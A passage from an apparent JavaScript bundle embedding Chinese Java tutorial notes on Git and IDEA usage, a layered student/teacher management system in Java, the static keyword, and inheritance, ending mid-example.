![57_配置SSH公钥](./img/java/basics/day10-Git.img/57_配置SSH公钥.png)\n\n    4. 公钥测试\n\n       + 命令: ssh -T git@gitee.com\n\n       ![58_配置SSH公钥](./img/java/basics/day10-Git.img/58_配置SSH公钥.png)\n\n+  推送到远程仓库\n\n  + 步骤\n\n    1. 为远程仓库的URL（网址），自定义仓库名称\n    2. 推送\n\n  + 命令\n       git remote add 远程名称 远程仓库URL\n       git push -u 仓库名称 分支名\n\n    ![59_配置SSH公钥](./img/java/basics/day10-Git.img/59_配置SSH公钥.png)\n\n    ![60_配置SSH公钥](./img/java/basics/day10-Git.img/60_配置SSH公钥.png)\n\n### 5.5先有远程仓库,本地为空(应用)\n\n+ 步骤\n  1. 将远程仓库的代码，克隆到本地仓库\n    克隆命令：git clone 仓库地址\n  2. 创建新文件，添加并提交到本地仓库\n  3. 推送至远程仓库\n  4. 项目拉取更新\n    拉取命令：git pull 远程仓库名 分支名\n\n### 5.6代码冲突(应用)\n\n+ 产生原因:\n\n  两个程序员操作同一个文件,其中一个程序员在修改文件后,push到远程仓库,另一个程序员应该先pull将最新的代码更新到本地仓库后,在修改代码,之后push到远程仓库,结果他没有先pull将最新的代码更新到本地仓库,而是直接将自己的代码push到远程仓库,这样就可能会导致代码冲突\n\n![61_代码冲突](./img/java/basics/day10-Git.img/61_代码冲突.png)\n\n\n\n![62_代码冲突](./img/java/basics/day10-Git.img/62_代码冲突.png)\n\n![63_代码冲突](./img/java/basics/day10-Git.img/63_代码冲突.png)\n\n+ 如何解决冲突\n\n  <<<<<<<和>>>>>>>中间的内容,就是冲突部分\n\n  1. 修改冲突行，保存，即可解决冲突。\n  2. 重新add冲突文件并commit到本地仓库，重新push到远程\n\n## 6.IDEA集成Git \n\n### 6.1IDEA中配置Git(应用)\n\n1. File -> Settings\n\n![64_IDEA中配置Git](./img/java/basics/day10-Git.img/64_IDEA中配置Git.png)\n\n2. Version Control -> Git -> 指定git.exe存放目录\n\n![65_IDEA中配置Git](./img/java/basics/day10-Git.img/65_IDEA中配置Git.png)\n\n3. 点击Test测试\n\n![66_IDEA中配置Git](./img/java/basics/day10-Git.img/66_IDEA中配置Git.png)\n\n### 6.2创建本地仓库(应用)\n\n1. VCS->Import into Version Control->Create Git Repository\n\n   ![67_创建本地仓库](./img/java/basics/day10-Git.img/67_创建本地仓库.png)\n\n2. 选择工程所在的目录,这样就创建好本地仓库了\n\n   ![68_创建本地仓库](./img/java/basics/day10-Git.img/68_创建本地仓库.png)\n\n3. 点击git后边的对勾,将当前项目代码提交到本地仓库\n\n   注意: 项目中的配置文件不需要提交到本地仓库中,提交时,忽略掉即可\n\n   ![69_创建本地仓库](./img/java/basics/day10-Git.img/69_创建本地仓库.png)\n\n### 6.3版本切换(应用)\n\n+ 方式一: 控制台Version Control->Log->Reset Current Branch...->Reset\n\n  这种切换的特点是会抛弃原来的提交记录\n\n  ![70_版本切换](./img/java/basics/day10-Git.img/70_版本切换.png)\n\n+ 方式二:控制台Version Control->Log->Revert Commit->Merge->处理代码->commit\n\n  这种切换的特点是会当成一个新的提交记录,之前的提交记录也都保留\n\n  ![71_版本切换](./img/java/basics/day10-Git.img/71_版本切换.png)\n\n  ![72_版本切换](./img/java/basics/day10-Git.img/72_版本切换.png)\n\n  ​\t\t![73_版本切换](./img/java/basics/day10-Git.img/73_版本切换.png)\n\n\n\n### 6.4分支管理(应用)\n\n+ 创建分支\n\n  VCS->Git->Branches->New Branch->给分支起名字->ok\n\n  ![74_创建分支](./img/java/basics/day10-Git.img/74_创建分支.png)\n\n+ 切换分支\n\n  idea右下角Git->选择要切换的分支->checkout\n\n  ![75_切换分支](./img/java/basics/day10-Git.img/75_切换分支.png)\n\n+ 合并分支\n\n  VCS->Git->Merge changes->选择要合并的分支->merge\n\n  ![76_合并分支](./img/java/basics/day10-Git.img/76_合并分支.png)\n\n  处理分支中的代码\n\n  ![77_合并分支](./img/java/basics/day10-Git.img/77_合并分支.png)\n\n  ![78_合并分支](./img/java/basics/day10-Git.img/78_合并分支.png)\n\n  ![79_合并分支](./img/java/basics/day10-Git.img/79_合并分支.png)\n\n+ 删除分支\n\n  idea右下角->选中要删除的分支->Delete\n\n  ![80_删除分支](./img/java/basics/day10-Git.img/80_删除分支.png)\n\n### 6.5本地仓库推送到远程仓库(应用)\n\n1. VCS->Git->Push->点击master Define remote\n\n   ![81_本地仓库推送到远程仓库](./img/java/basics/day10-Git.img/81_本地仓库推送到远程仓库.png)\n\n2. 将远程仓库的路径复制过来->Push\n\n   ![82_本地仓库推送到远程仓库](./img/java/basics/day10-Git.img/82_本地仓库推送到远程仓库.png)\n\n### 6.6远程仓库克隆到本地仓库(应用)\n\nFile->Close Project->Checkout from Version Control->Git->指定远程仓库的路径->指定本地存放的路径->clone\n\n![83_远程仓库克隆到本地仓库](./img/java/basics/day10-Git.img/83_远程仓库克隆到本地仓库.png)\n\n\n\n\n\n\n\n\n\n",K={data:function(){return{MainComponent:Q}}},X=K,Y=Object(u["a"])(X,G,V,!1,null,"2139937c",null),Z=Y.exports,nn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}}),t("q-markdown",{attrs:{src:n.MainComponent3}})],1)},rn=[],tn='## 1.案例驱动模式\n\n### 1.1案例驱动模式概述 (理解)\n\n通过我们已掌握的知识点,先实现一个案例,然后找出这个案例中,存在的一些问题,在通过新知识点解决问题\n\n### 1.2案例驱动模式的好处 (理解)\n\n+ 解决重复代码过多的冗余,提高代码的复用性\n+ 解决业务逻辑聚集紧密导致的可读性差,提高代码的可读性\n+ 解决代码可维护性差,提高代码的维护性\n\n## 2.分类思想 \n\n### 2.1分类思想概述 (理解) \n\n分工协作,专人干专事\n\n### 2.2黑马信息管理系统 (理解)\n\n+ Student类  标准学生类,封装键盘录入的学生信息(id , name , age , birthday)\n\n+ StudentDao类  Dao : (Data Access Object 缩写) 用于访问存储数据的数组或集合\n\n+ StudentService类  用来进行业务逻辑的处理(例如: 判断录入的id是否存在)\n\n+ StudentController类  和用户打交道(接收用户需求,采集用户信息,打印数据到控制台)\n\n  ![01_黑马信息管理系统分类](./img/java/basics/day11-分类和static.img/01_黑马信息管理系统分类.png)\n\n## 3.分包思想\n\n### 3.1分包思想概述 (理解)\n\n如果将所有的类文件都放在同一个包下,不利于管理和后期维护,所以,对于不同功能的类文件,可以放在不同的包下进行管理\n\n### 3.2包的概述 (记忆)\n\n+ 包\n\n  本质上就是文件夹\n\n+ 创建包\n\n  多级包之间使用 " . " 进行分割\n  多级包的定义规范：公司的网站地址翻转(去掉www)\n  比如：黑马程序员的网站址为www.itheima.com\n  后期我们所定义的包的结构就是：com.itheima.其他的包名\n\n+ 包的命名规则\n\n  字母都是小写\n\n### 3.3包的注意事项 (理解) \n\n+ package语句必须是程序的第一条可执行的代码 \n+ package语句在一个java文件中只能有一个 \n+ 如果没有package,默认表示无包名 \n\n### 3.4类与类之间的访问 (理解) \n\n+ 同一个包下的访问\n\n  不需要导包，直接使用即可\n\n+ 不同包下的访问\n\n  1.import 导包后访问\n\n  2.通过全类名（包名 + 类名）访问\n\n+ 注意：import 、package 、class 三个关键字的摆放位置存在顺序关系\n\n  package 必须是程序的第一条可执行的代码\n\n  import 需要写在 package 下面\n\n  class 需要在 import 下面\n\n## 4.黑马信息管理系统\n\n### 4.1系统介绍 (理解) \n\n![02_黑马信息管理系统介绍](./img/java/basics/day11-分类和static.img/02_黑马信息管理系统介绍.png)\n\n### 4.2学生管理系统 (应用) \n\n#### 4.2.1需求说明\n\n+ 添加学生: 键盘录入学生信息(id，name，age，birthday)\n\n  使用数组存储学生信息,要求学生的id不能重复\n\n+ 删除学生: 键盘录入要删除学生的id值,将该学生从数组中移除,如果录入的id在数组中不存在,需要重新录入\n\n+ 修改学生: 键盘录入要修改学生的id值和修改后的学生信息\n\n  将数组中该学生的信息修改,如果录入的id在数组中不存在,需要重新录入\n\n+ 查询学生: 将数组中存储的所有学生的信息输出到控制台\n\n#### 4.2.2实现步骤\n\n+ 环境搭建实现步骤 \n  | 包                                       | 存储的类                   | 作用                   |\n  | --------------------------------------- | ---------------------- | -------------------- |\n  | com.itheima.edu.info.manager.domain     | Student.java           | 封装学生信息               |\n  | com.itheima.edu.info.manager.dao        | StudentDao.java        | 访问存储数据的数组，进行赠删改查（库管） |\n  | com.itheima.edu.info.manager.service    | StudentService.java    | 业务的逻辑处理（业务员）         |\n  | com.itheima.edu.info.manager.controller | StudentController.java | 和用户打交道（客服接待）         |\n  | com.itheima.edu.info.manager.entry      | InfoManagerEntry.java  | 程序的入口类，提供一个main方法    |\n\n+ 菜单搭建实现步骤 \n\n  + 需求\n    + 黑马管理系统菜单搭建\n    + 学生管理系统菜单搭建\n  + 实现步骤\n    1. 展示欢迎页面,用输出语句完成主界面的编写\n    2. 获取用户的选择,用Scanner实现键盘录入数据\n    3. 根据用户的选择执行对应的操作,用switch语句完成操作的选择\n\n+ 添加功能实现步骤 \n\n  ![03_添加功能需求分析](./img/java/basics/day11-分类和static.img/03_添加功能需求分析.png)\n\n\n+ 添加功能优化:判断id是否存在\n\n  ![04_判断id是否存在](./img/java/basics/day11-分类和static.img/04_判断id是否存在.png)\n\n+ 查询功能实现步骤\n\n  ![05_查询功能需求分析](./img/java/basics/day11-分类和static.img/05_查询功能需求分析.png)\n\n+ 删除功能实现步骤\n\n  ![06_删除功能需求分析](./img/java/basics/day11-分类和static.img/06_删除功能需求分析.png)\n\n+ 修改功能实现步骤 \n\n  ![07_修改功能需求分析](./img/java/basics/day11-分类和static.img/07_修改功能需求分析.png)\n\n+ 系统优化 \n\n  + 把updateStudent和deleteStudentById中录入学生id代码抽取到一个方法(inputStudentId)中\n    该方法的主要作用就是录入学生的id，方法的返回值为String类型\n\n\n  + 把addStudent和updateStudent中录入学生信息的代码抽取到一个方法(inputStudentInfo)中\n    该方法的主要作用就是录入学生的信息，并封装为学生对象，方法的返回值为Student类型 \n\n#### 4.2.3代码实现 \n\n学生类\n\n```java\npublic class Student {\n    private String id;\n    private String name;\n    private String age;\n    private String birthday;\n    String address;\n\n    public Student() {\n    }\n\n    public Student(String id, String name, String age, String birthday) {\n        this.id = id;\n        this.name = name;\n        this.age = age;\n        this.birthday = birthday;\n    }\n\n    public String getId() {\n        return id;\n    }\n\n    public void setId(String id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getAge() {\n        return age;\n    }\n\n    public void setAge(String age) {\n        this.age = age;\n    }\n\n    public String getBirthday() {\n        return birthday;\n    }\n\n    public void setBirthday(String birthday) {\n        this.birthday = birthday;\n    }\n\n}\n```\n\n程序入口InfoManagerEntry类\n\n```java\npublic class InfoManagerEntry {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        while (true) {\n            // 主菜单搭建\n            System.out.println("--------欢迎来到黑马信息管理系统--------");\n            System.out.println("请输入您的选择: 1.学生管理  2.老师管理  3.退出");\n            String choice = sc.next();\n            switch (choice) {\n                case "1":\n                    // System.out.println("学生管理");\n                    // 开启学生管理系统\n                    StudentController studentController = new StudentController();\n                    studentController.start();\n                    break;\n                case "2":\n                    System.out.println("老师管理");\n                    TeacherController teacherController = new TeacherController();\n                    teacherController.start();\n                    break;\n                case "3":\n                    System.out.println("感谢您的使用");\n                    // 退出当前正在运行的JVM虚拟机\n                    System.exit(0);\n                    break;\n                default:\n                    System.out.println("您的输入有误, 请重新输入");\n                    break;\n            }\n        }\n    }\n}\n```\n\nStudentController类\n\n```java\npublic class StudentController {\n    // 业务员对象\n    private StudentService studentService = new StudentService();\n\n    private Scanner sc = new Scanner(System.in);\n\n    // 开启学生管理系统, 并展示学生管理系统菜单\n    public void start() {\n        //Scanner sc = new Scanner(System.in);\n        studentLoop:\n        while (true) {\n            System.out.println("--------欢迎来到 <学生> 管理系统--------");\n            System.out.println("请输入您的选择: 1.添加学生  2.删除学生  3.修改学生  4.查看学生  5.退出");\n            String choice = sc.next();\n            switch (choice) {\n                case "1":\n                    // System.out.println("添加");\n                    addStudent();\n                    break;\n                case "2":\n                    // System.out.println("删除");\n                    deleteStudentById();\n                    break;\n                case "3":\n                    // System.out.println("修改");\n                    updateStudent();\n                    break;\n                case "4":\n                    // System.out.println("查询");\n                    findAllStudent();\n                    break;\n                case "5":\n                    System.out.println("感谢您使用学生管理系统, 再见!");\n                    break studentLoop;\n                default:\n                    System.out.println("您的输入有误, 请重新输入");\n                    break;\n            }\n        }\n    }\n\n    // 修改学生方法\n    public void updateStudent() {\n        String updateId = inputStudentId();\n        Student newStu = inputStudentInfo(updateId);\n        studentService.updateStudent(updateId, newStu);\n\n        System.out.println("修改成功!");\n    }\n\n    // 删除学生方法\n    public void deleteStudentById() {\n        String delId = inputStudentId();\n        // 3. 调用业务员中的deleteStudentById根据id, 删除学生\n        studentService.deleteStudentById(delId);\n        // 4. 提示删除成功\n        System.out.println("删除成功!");\n    }\n\n    // 查看学生方法\n    public void findAllStudent() {\n        // 1. 调用业务员中的获取方法, 得到学生的对象数组\n        Student[] stus = studentService.findAllStudent();\n        // 2. 判断数组的内存地址, 是否为null\n        if (stus == null) {\n            System.out.println("查无信息, 请添加后重试");\n            return;\n        }\n        // 3. 遍历数组, 获取学生信息并打印在控制台\n        System.out.println("学号\\t\\t姓名\\t年龄\\t生日");\n        for (int i = 0; i < stus.length; i++) {\n            Student stu = stus[i];\n            if (stu != null) {\n                System.out.println(stu.getId() + "\\t" + stu.getName() + "\\t" + stu.getAge() + "\\t\\t" + stu.getBirthday());\n            }\n        }\n    }\n\n    // 添加学生方法\n    public void addStudent() {\n        // StudentService studentService = new StudentService();\n        // 1. 键盘接收学生信息\n        String id;\n        while (true) {\n            System.out.println("请输入学生id:");\n            id = sc.next();\n            boolean flag = studentService.isExists(id);\n            if (flag) {\n                System.out.println("学号已被占用, 请重新输入");\n            } else {\n                break;\n            }\n        }\n\n        Student stu = inputStudentInfo(id);\n\n        // 3. 将学生对象,传递给StudentService(业务员)中的addStudent方法\n        boolean result = studentService.addStudent(stu);\n        // 4. 根据返回的boolean类型结果, 在控制台打印成功\\失败\n        if (result) {\n            System.out.println("添加成功");\n        } else {\n            System.out.println("添加失败");\n        }\n    }\n\n    // 键盘录入学生id\n    public String inputStudentId() {\n        String id;\n        while (true) {\n            System.out.println("请输入学生id:");\n            id = sc.next();\n            boolean exists = studentService.isExists(id);\n            if (!exists) {\n                System.out.println("您输入的id不存在, 请重新输入:");\n            } else {\n                break;\n            }\n        }\n        return id;\n    }\n\n    // 键盘录入学生信息\n    public Student inputStudentInfo(String id) {\n        System.out.println("请输入学生姓名:");\n        String name = sc.next();\n        System.out.println("请输入学生年龄:");\n        String age = sc.next();\n        System.out.println("请输入学生生日:");\n        String birthday = sc.next();\n        Student stu = new Student();\n        stu.setId(id);\n        stu.setName(name);\n        stu.setAge(age);\n        stu.setBirthday(birthday);\n        return stu;\n    }\n}\n```\n\nStudentService类\n\n```java\npublic class StudentService {\n    // 创建StudentDao (库管)\n    private StudentDao studentDao = new StudentDao();\n    // 添加学生方法\n    public boolean addStudent(Student stu) {\n        // 2. 将学生对象, 传递给StudentDao 库管中的addStudent方法\n        // 3. 将返回的boolean类型结果, 返还给StudentController\n        return studentDao.addStudent(stu);\n    }\n    // 判断学号是否存在方法\n    public boolean isExists(String id) {\n        Student[] stus = studentDao.findAllStudent();\n        // 假设id在数组中不存在\n        boolean exists = false;\n        // 遍历数组, 获取每一个学生对象, 准备进行判断\n        for (int i = 0; i < stus.length; i++) {\n            Student student = stus[i];\n            if(student != null && student.getId().equals(id)){\n                exists = true;\n                break;\n            }\n        }\n\n        return exists;\n    }\n    // 查看学生方法\n    public Student[] findAllStudent() {\n        // 1. 调用库管对象的findAllStudent获取学生对象数组\n        Student[] allStudent = studentDao.findAllStudent();\n        // 2. 判断数组中是否有学生信息 (有: 返回地址,  没有: 返回null)\n        // 思路: 数组中只要存在一个不是null的元素, 那就代表有学生信息\n        boolean flag = false;\n        for (int i = 0; i < allStudent.length; i++) {\n            Student stu = allStudent[i];\n            if(stu != null){\n                flag = true;\n                break;\n            }\n        }\n\n        if(flag){\n            // 有信息\n            return allStudent;\n        }else{\n            // 没有信息\n            return null;\n        }\n\n    }\n\n    public void deleteStudentById(String delId) {\n        studentDao.deleteStudentById(delId);\n    }\n\n    public void updateStudent(String updateId, Student newStu) {\n        studentDao.updateStudent(updateId, newStu);\n    }\n}\n```\n\nStudentDao类\n\n```java\npublic class StudentDao {\n    // 创建学生对象数组\n    private static Student[] stus = new Student[5];\n    // 添加学生方法\n    public boolean addStudent(Student stu) {\n\n        // 2. 添加学生到数组\n        //2.1 定义变量index为-1，假设数组已经全部存满，没有null的元素\n        int index = -1;\n        //2.2 遍历数组取出每一个元素，判断是否是null\n        for (int i = 0; i < stus.length; i++) {\n            Student student = stus[i];\n            if(student == null){\n                index = i;\n                //2.3 如果为null，让index变量记录当前索引位置，并使用break结束循环遍历\n                break;\n            }\n        }\n\n        // 3. 返回是否添加成功的boolean类型状态\n        if(index == -1){\n            // 装满了\n            return false;\n        }else{\n            // 没有装满, 正常添加, 返回true\n            stus[index] = stu;\n            return true;\n        }\n    }\n    // 查看学生方法\n    public Student[] findAllStudent() {\n        return stus;\n    }\n\n    public void deleteStudentById(String delId) {\n        // 1. 查找id在容器中所在的索引位置\n        int index = getIndex(delId);\n        // 2. 将该索引位置,使用null元素进行覆盖\n        stus[index] = null;\n    }\n\n    public int getIndex(String id){\n        int index = -1;\n        for (int i = 0; i < stus.length; i++) {\n            Student stu = stus[i];\n            if(stu != null && stu.getId().equals(id)){\n                index = i;\n                break;\n            }\n        }\n        return index;\n    }\n\n    public void updateStudent(String updateId, Student newStu) {\n        // 1. 查找updateId, 在容器中的索引位置\n        int index = getIndex(updateId);\n        // 2. 将该索引位置, 使用新的学生对象替换\n        stus[index] = newStu;\n    }\n}\n```\n\n### 4.3老师管理系统 (应用) \n\n#### 4.3.1需求说明 \n\n+ 添加老师: 通过键盘录入老师信息(id，name，age，birthday)\n\n  使用数组存储老师信息,要求老师的id不能重复\n\n+ 删除老师: 通过键盘录入要删除老师的id值,将该老师从数组中移除,如果录入的id在数组中不存在,需要重新录入\n\n+ 修改老师: 通过键盘录入要修改老师的id值和修改后的老师信息\n\n  将数组中该老师的信息修改,如果录入的id在数组中不存在,需要重新录入\n\n+ 查询老师: 将数组中存储的所有老师的信息输出到控制台\n\n#### 4.3.2实现步骤 \n\n+ 环境搭建实现步骤\n\n  | 包                                       | 存储的类                                     | 作用                   |\n  | --------------------------------------- | ---------------------------------------- | -------------------- |\n  | com.itheima.edu.info.manager.domain     | Student.java   Teacher.java              | 封装学生信息  封装老师信息       |\n  | com.itheima.edu.info.manager.dao        | StudentDao.java  TeacherDao.java         | 访问存储数据的数组,进行赠删改查（库管） |\n  | com.itheima.edu.info.manager.service    | StudentService.java  TeacherService.java | 业务的逻辑处理（业务员）         |\n  | com.itheima.edu.info.manager.controller | StudentController.java  TeacherController.java | 和用户打交道（客服接待）         |\n  | com.itheima.edu.info.manager.entry      | InfoManagerEntry.java                    | 程序的入口类,提供一个main方法    |\n\n+ 菜单搭建实现步骤\n\n  1. 展示欢迎页面,用输出语句完成主界面的编写\n  2. 获取用户的选择,用Scanner实现键盘录入数据\n  3. 根据用户的选择执行对应的操作,用switch语句完成操作的选择\n\n+ 添加功能实现步骤\n\n  ![10_添加老师功能实现步骤](./img/java/basics/day11-分类和static.img/10_添加老师功能实现步骤.png)\n\n+ 查询功能实现步骤\n\n  ![11_查询老师功能实现步骤](./img/java/basics/day11-分类和static.img/11_查询老师功能实现步骤.png)\n\n+ 删除功能实现步骤\n\n  ![12_删除老师功能实现步骤](./img/java/basics/day11-分类和static.img/12_删除老师功能实现步骤.png)\n\n+ 修改功能实现步骤\n\n  ![13_修改老师功能实现步骤](./img/java/basics/day11-分类和static.img/13_修改老师功能实现步骤.png)\n\n+ 系统优化\n\n  + 把updateTeacher和deleteTeacherById中录入老师id代码抽取到一个方法(inputTeacherId)中\n    该方法的主要作用就是录入老师的id,方法的返回值为String类型\n  + 把addTeacher和updateTeacher中录入老师信息的代码抽取到一个方法(inputTeacherInfo)中\n    该方法的主要作用就是录入老师的信息,并封装为老师对象,方法的返回值为Teacher类型\n\n#### 4.3.3代码实现\n\n老师类\n\n```java\npublic class Teacher extends Person{\n\tprivate String id;\n    private String name;\n    private String age;\n    private String birthday;\n    String address;\n\n    public Teacher() {\n    }\n\n    public Teacher(String id, String name, String age, String birthday) {\n        this.id = id;\n        this.name = name;\n        this.age = age;\n        this.birthday = birthday;\n    }\n\n    public String getId() {\n        return id;\n    }\n\n    public void setId(String id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getAge() {\n        return age;\n    }\n\n    public void setAge(String age) {\n        this.age = age;\n    }\n\n    public String getBirthday() {\n        return birthday;\n    }\n\n    public void setBirthday(String birthday) {\n        this.birthday = birthday;\n    }\n}\n```\n\nTeacherController类\n\n```java\npublic class TeacherController {\n\n    private Scanner sc = new Scanner(System.in);\n    private TeacherService teacherService = new TeacherService();\n\n    public void start() {\n\n        teacherLoop:\n        while (true) {\n            System.out.println("--------欢迎来到 <老师> 管理系统--------");\n            System.out.println("请输入您的选择: 1.添加老师  2.删除老师  3.修改老师  4.查看老师  5.退出");\n            String choice = sc.next();\n            switch (choice) {\n                case "1":\n                    // System.out.println("添加老师");\n                    addTeacher();\n                    break;\n                case "2":\n                    // System.out.println("删除老师");\n                    deleteTeacherById();\n                    break;\n                case "3":\n                    // System.out.println("修改老师");\n                    updateTeacher();\n                    break;\n                case "4":\n                    // System.out.println("查看老师");\n                    findAllTeacher();\n                    break;\n                case "5":\n                    System.out.println("感谢您使用老师管理系统, 再见!");\n                    break teacherLoop;\n                default:\n                    System.out.println("您的输入有误, 请重新输入");\n                    break;\n            }\n        }\n\n    }\n\n    public void updateTeacher() {\n        String id = inputTeacherId();\n\n        Teacher newTeacher = inputTeacherInfo(id);\n\n        // 调用业务员的修改方法\n        teacherService.updateTeacher(id,newTeacher);\n        System.out.println("修改成功");\n    }\n\n    public void deleteTeacherById() {\n\n        String id = inputTeacherId();\n\n        // 2. 调用业务员中的删除方法, 根据id, 删除老师\n        teacherService.deleteTeacherById(id);\n\n        // 3. 提示删除成功\n        System.out.println("删除成功");\n\n\n    }\n\n    public void findAllTeacher() {\n        // 1. 从业务员中, 获取老师对象数组\n        Teacher[] teachers = teacherService.findAllTeacher();\n\n        // 2. 判断数组中是否有元素\n        if (teachers == null) {\n            System.out.println("查无信息, 请添加后重试");\n            return;\n        }\n\n        // 3. 遍历数组, 取出元素, 并打印在控制台\n        System.out.println("学号\\t\\t姓名\\t年龄\\t生日");\n        for (int i = 0; i < teachers.length; i++) {\n            Teacher t = teachers[i];\n            if (t != null) {\n                System.out.println(t.getId() + "\\t" + t.getName() + "\\t" + t.getAge() + "\\t\\t" + t.getBirthday());\n            }\n        }\n    }\n\n    public void addTeacher() {\n        String id;\n        while (true) {\n            // 1. 接收不存在的老师id\n            System.out.println("请输入老师id:");\n            id = sc.next();\n            // 2. 判断id是否存在\n            boolean exists = teacherService.isExists(id);\n\n            if (exists) {\n                System.out.println("id已被占用, 请重新输入:");\n            } else {\n                break;\n            }\n        }\n\n        Teacher t = inputTeacherInfo(id);\n\n        // 5. 将封装好的老师对象, 传递给TeacherService继续完成添加操作\n        boolean result = teacherService.addTeacher(t);\n\n        if (result) {\n            System.out.println("添加成功");\n        } else {\n            System.out.println("添加失败");\n        }\n    }\n\n    // 录入老师id\n    public String inputTeacherId(){\n        String id;\n        while(true){\n            System.out.println("请输入id");\n            id = sc.next();\n            boolean exists = teacherService.isExists(id);\n            if(!exists){\n                System.out.println("您输入的id不存在, 请重新输入:");\n            }else{\n                break;\n            }\n        }\n        return id;\n    }\n\n    // 录入老师信息, 封装为老师对象\n    public Teacher inputTeacherInfo(String id){\n        System.out.println("请输入老师姓名:");\n        String name = sc.next();\n        System.out.println("请输入老师年龄:");\n        String age = sc.next();\n        System.out.println("请输入老师生日:");\n        String birthday = sc.next();\n\n        Teacher t = new Teacher();\n        t.setId(id);\n        t.setName(name);\n        t.setAge(age);\n        t.setBirthday(birthday);\n\n        return t;\n    }\n}\n```\n\nTeacherService类\n\n```java\npublic class TeacherService {\n\n    private TeacherDao teacherDao = new TeacherDao();\n\n    public boolean addTeacher(Teacher t) {\n        return teacherDao.addTeacher(t);\n    }\n\n    public boolean isExists(String id) {\n        // 1. 获取库管对象中的数组\n        Teacher[] teachers = teacherDao.findAllTeacher();\n\n        boolean exists = false;\n\n        // 2. 遍历数组, 取出每一个元素, 进行判断\n        for (int i = 0; i < teachers.length; i++) {\n            Teacher teacher = teachers[i];\n            if(teacher != null && teacher.getId().equals(id)){\n                exists = true;\n                break;\n            }\n        }\n\n        return exists;\n    }\n\n    public Teacher[] findAllTeacher() {\n        Teacher[] allTeacher = teacherDao.findAllTeacher();\n\n        boolean flag = false;\n\n        for (int i = 0; i < allTeacher.length; i++) {\n            Teacher t = allTeacher[i];\n            if(t != null){\n                flag = true;\n                break;\n            }\n        }\n\n        if(flag){\n            return allTeacher;\n        }else{\n            return null;\n        }\n\n    }\n\n    public void deleteTeacherById(String id) {\n        teacherDao.deleteTeacherById(id);\n    }\n\n    public void updateTeacher(String id, Teacher newTeacher) {\n        teacherDao.updateTeacher(id,newTeacher);\n    }\n}\n```\n\nTeacherDao类\n\n```java\npublic class TeacherDao {\n\n    private static Teacher[] teachers = new Teacher[5];\n\n    public boolean addTeacher(Teacher t) {\n        int index = -1;\n        for (int i = 0; i < teachers.length; i++) {\n            Teacher teacher = teachers[i];\n            if(teacher == null){\n                index = i;\n                break;\n            }\n        }\n\n        if(index == -1){\n            return false;\n        }else{\n            teachers[index] = t;\n            return true;\n        }\n\n    }\n\n    public Teacher[] findAllTeacher() {\n        return teachers;\n    }\n\n    public void deleteTeacherById(String id) {\n        // 1. 查询id在数组中的索引位置\n        int index = getIndex(id);\n        // 2. 将该索引位置的元素, 使用null进行替换\n        teachers[index] = null;\n    }\n\n    public int getIndex(String id){\n        int index = -1;\n        for (int i = 0; i < teachers.length; i++) {\n            Teacher t = teachers[i];\n            if(t != null && t.getId().equals(id)){\n                index = i;\n                break;\n            }\n        }\n\n        return index;\n    }\n\n    public void updateTeacher(String id, Teacher newTeacher) {\n        int index = getIndex(id);\n        teachers[index] = newTeacher;\n    }\n}\n```\n\n## 5.static关键字\n\n### 5.1static关键字概述 (理解)\n\nstatic 关键字是静态的意思,是Java中的一个修饰符,可以修饰成员方法,成员变量\n\n### 5.2static修饰的特点 (记忆) \n\n+ 被类的所有对象共享\n\n  是我们判断是否使用静态关键字的条件\n\n+ 随着类的加载而加载，优先于对象存在\n\n  对象需要类被加载后，才能创建\n\n+ 可以通过类名调用\n\n  也可以通过对象名调用\n\n### 5.3static关键字注意事项 (理解)\n\n+ 静态方法只能访问静态的成员\n+ 非静态方法可以访问静态的成员，也可以访问非静态的成员\n+ 静态方法中是没有this关键字 ',en='## 1. 继承\n\n### 1.1 继承的实现（掌握）\n\n- 继承的概念\n\n  - 继承是面向对象三大特征之一，可以使得子类具有父类的属性和方法，还可以在子类中重新定义，以及追加属性和方法\n\n- 实现继承的格式\n\n  - 继承通过extends实现\n  - 格式：class 子类 extends 父类 { } \n    - 举例：class Dog extends Animal { }\n\n- 继承带来的好处\n\n  - 继承可以让类与类之间产生关系，子父类关系，产生子父类后，子类则可以使用父类中非私有的成员。\n\n- 示例代码\n\n  ```java\n  public class Fu {\n      public void show() {\n          System.out.println("show方法被调用");\n      }\n  }\n  public class Zi extends Fu {\n      public void method() {\n          System.out.println("method方法被调用");\n      }\n  }\n  public class Demo {\n      public static void main(String[] args) {\n          //创建对象，调用方法\n          Fu f = new Fu();\n          f.show();\n\n          Zi z = new Zi();\n          z.method();\n          z.show();\n      }\n  }\n  ```\n\n### 1.2 继承的好处和弊端（理解）\n\n- 继承好处\n  - 提高了代码的复用性(多个类相同的成员可以放到同一个类中)\n  - 提高了代码的维护性(如果方法的代码需要修改，修改一处即可)\n- 继承弊端\n  - 继承让类与类之间产生了关系，类的耦合性增强了，当父类发生变化时子类实现也不得不跟着变化，削弱了子类的独立性\n- 继承的应用场景：\n  - 使用继承，需要考虑类与类之间是否存在is..a的关系，不能盲目使用继承\n    - is..a的关系：谁是谁的一种，例如：老师和学生是人的一种，那人就是父类，学生和老师就是子类\n\n### 1.3. Java中继承的特点（掌握）\n\n- Java中继承的特点\n\n  1. Java中类只支持单继承，不支持多继承\n     - 错误范例：class A extends B, C { }\n  2. Java中类支持多层继承\n\n- 多层继承示例代码：\n\n  ```java\n  public class Granddad {\n\n      public void drink() {\n          System.out.println("爷爷爱喝酒");\n      }\n\n  }\n\n  public class Father extends Granddad {\n\n      public void smoke() {\n          System.out.println("爸爸爱抽烟");\n      }\n\n  }\n\n  public class Mother {\n\n      public void dance() {\n          System.out.println("妈妈爱跳舞");\n      }\n\n  }\n  public class Son extends Father {\n  \t// 此时，Son类中就同时拥有drink方法以及smoke方法\n  }\n  ```\n\n## 2. 继承中的成员访问特点\n\n### 2.1 继承中变量的访问特点（掌握）\n\n在子类方法中访问一个变量，采用的是就近原则。\n\n1. 子类局部范围找\n2. 子类成员范围找\n3. 父类成员范围找\n4. 如果都没有就报错(不考虑父亲的父亲…)\n\n- 示例代码\n\n  ```java\n  class Fu {\n      int num = 10;\n  }\n  class Zi {\n      int num = 20;\n      public void show(){\n          int num = 30;\n          